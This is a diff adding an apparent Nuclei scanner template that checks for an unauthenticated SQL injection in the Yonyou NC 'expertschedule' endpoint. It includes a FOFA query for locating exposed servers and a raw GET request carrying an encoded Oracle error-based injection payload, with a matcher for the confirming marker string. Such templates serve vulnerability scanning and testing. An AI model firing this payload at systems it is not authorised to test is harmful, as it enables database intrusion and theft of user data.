@@ -1,0 +1,30 @@
+id: yongyouNC-expertschedule-sql
+
+info:
+  name: 用友NC expertschedule SQL注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+    用友NC expertschedule接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。
+  reference:
+    - https://mp.weixin.qq.com/s/edSnM1ewdPjX6olXyGzUqA
+  tags: sql injection
+
+
+  
+http:
+  - raw:
+      - |
+        GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1%27+AND+6248%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%286248%3D6248%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+QtwN HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qkxzq1qpvbq'
+      - type: status
+        status: 
+          - 200
